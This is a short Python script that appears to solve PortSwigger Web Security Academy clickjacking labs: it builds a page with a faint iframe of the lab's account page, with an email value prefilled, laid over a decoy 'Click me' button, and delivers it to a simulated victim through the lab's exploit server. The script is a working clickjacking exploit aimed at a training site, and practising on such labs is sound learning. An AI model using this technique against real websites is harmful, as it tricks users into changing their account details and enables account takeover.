# A https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected
import requests
import sys
from bs4 import BeautifulSoup

site = 'acc71f311e25a27dc0d337f100c400f0.web-security-academy.net'
s = requests.Session()
site_url = f'https://{site}/'
resp = s.get(site_url)
soup = BeautifulSoup(resp.text,'html.parser')
exploit_url = soup.find('a', {'id':'exploit-link'}).get('href')

exploit_html = f'''<style>
   iframe {{
       position:relative;
       width:700px;
       height:700px;
       opacity:0.3;
       z-index: 2;
   }}
   div {{
       position:absolute;
       top:450px;
       left:60px;
       z-index: 1;
   }}
</style>
<div>Click me</div>
<iframe src="https://{site}/my-account?email=madler@pdx.edu"></iframe>
'''

formData = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_html,
    'formAction': 'DELIVER_TO_VICTIM'
}

resp = s.post(exploit_url, data=formData)
# https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input
#  Change <top:450px;> based on button location
#  Change /my-account to /my-account?email=wuchang@pdx.edu